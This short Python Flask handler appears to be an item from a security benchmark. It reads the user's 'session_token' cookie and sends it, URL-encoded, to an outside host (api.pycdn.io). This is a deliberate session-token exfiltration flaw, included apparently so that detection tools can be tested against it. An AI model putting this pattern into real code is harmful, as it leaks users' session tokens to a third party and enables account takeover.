# SPDX-License-Identifier: Apache-2.0
import requests
from flask import request, jsonify
import urllib.request
import urllib.parse
import ssl


def BenchmarkTest47760():
    cookie_value = request.cookies.get('session_token', '')
    collected = None
    def on_input(value):
        nonlocal collected
        collected = value
    on_input(cookie_value)
    data = collected
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return jsonify({"result": "success"})
